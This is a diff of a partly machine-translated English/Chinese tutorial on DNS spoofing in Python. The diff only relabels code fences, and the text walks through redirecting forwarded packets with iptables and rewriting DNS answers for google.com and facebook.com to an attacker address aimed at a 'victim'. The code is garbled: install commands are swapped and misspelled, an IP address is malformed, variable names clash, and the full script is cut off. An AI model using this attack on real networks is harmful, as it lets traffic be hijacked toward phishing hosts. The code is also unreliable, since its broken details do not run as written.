@@ -11,13 +11,13 @@
 
 *   **Netfilter queue:** [Netfilter queue](https://pypi.org/project/NetfilterQueue/) is a Python library, which provides access to data packets matched by iptables rules in Linux. Such matched packets can be accepted, discarded, changed or marked. Run the following command to install:
 
-```
+```py
 pip3 install scapy
 ```
 
 *   **Scapy:** [Scapy](https://scapy.readthedocs.io/en/latest/) is a Python package used to manipulate computer network packets. It can complete tasks such as scanning, tracking routing, probing, unit testing and network discovery. Run the following command to install:
 
-```
+```py
 pip3 install netfiltdrqueue
 ```
 
@@ -34,7 +34,7 @@ pip3 install netfiltdrqueue
 
 **步骤 1:** 导入模块。
 
-```
+```py
 from scapy.all import *
 
 import os
@@ -45,26 +45,26 @@ from netfilterqueue import NetfilterQueue
 
 **第 2 步:**将此规则插入到 IP 表中，这样数据包将被重定向到 NetfilterQuque。然后我们可以使用 scapy 包来修改队列中的数据包。队列号可以是您选择的任何数字。
 
-```
+```py
 os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  1")
 ```
 
 **步骤 3:** 创建网络过滤队列对象。
 
-```
+```py
 queue = NetfilterQueue()
 ```
 
 **步骤 4:** 将队列对象绑定到队列号和回调函数。然后在实现回调函数后启动队列。
 
-```
+```py
 queue.bind(queueNum,callback)
 queue.run()
 ```
 
 **第五步:**创建我们需要欺骗的主机名的 DNS 记录字典。您可以根据自己的选择添加更多的域名映射(所有映射的 IP 地址不必相同)。
 
-```
+```py
 hostsDict = {
     "google.com"  : "192.168..48.243",
     "facebook.com" : "192.168.48.243"
@@ -73,44 +73,44 @@ hostsDict = {
 
 **第 6 步:**当新的数据包进入队列时，将调用回调函数。数据包将作为参数传递给回调函数。
 
-```
+```py
 def callBack(packet):
 ```
 
 **步骤 7:** 接下来，将 NetfilterQueue 数据包转换为 scapy 数据包，以处理该数据包。
 
-```
+```py
 scapyPacket = IP(packet.get_payload())
 ```
 
 **步骤 8:** 检查数据包中是否有域名系统资源记录。如果它有 DNSRR，我们将修改数据包，否则不会对数据包进行任何更改。
 
-```
+```py
 if scapyPacket.haslayer(DNSRR):
 ```
 
 **步骤 9:** 从数据包中获取域名系统查询名称。查询名称是受害者发送给 DNS 服务器的主机名。
 
-```
+```py
 queryName = scapyPacket[DNSQR].qname
 ```
 
 **步骤 10:** 如果我们的目标主机字典中的查询名称，我们用主机字典中的 IP 地址修改 DNS 发送的 IP 地址。
 
-```
+```py
 if queryName in hostDict:
     sacpyPacket[DNS].an = DNSRR(rrname = queryName, rdata = hostDict[queryName])
 ```
 
 **步骤 11:** 修改数据包计数为 1，因为我们被发送给受害者一个单一的 DNSRR。
 
-```
+```py
 scapyPacket[DNS].ancount = 1
 ```
 
 **步骤 12:** 可以使用校验和和其他信息检测数据包损坏，因此我们删除它们，并使用 scapy 生成一个新条目。
 
-```
+```py
 del scapyPacket[IP].len
 del scapyPacket[IP].chksum
 del scapyPacket[UDP].len
@@ -119,19 +119,19 @@ del scapyPacket[UDP].chksum
 
 **步骤 13:** 将修改后的 scapy 数据包有效负载设置为 NetfilterQueue 数据包。
 
-```
+```py
 packet.set_payload(bytes(scapyPacket))
 ```
 
 **第 14 步:**数据包准备发送给受害者。
 
-```
+```py
 packet.accept()
 ```
 
 **步骤 15:** 终止脚本时，删除创建的 IP 表规则。
 
-```
+```py
 os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 1")
 ```
 
@@ -139,7 +139,7 @@ os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 1")
 
 ## 蟒 3
 
-```
+```py
 import os
 import logging as log
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
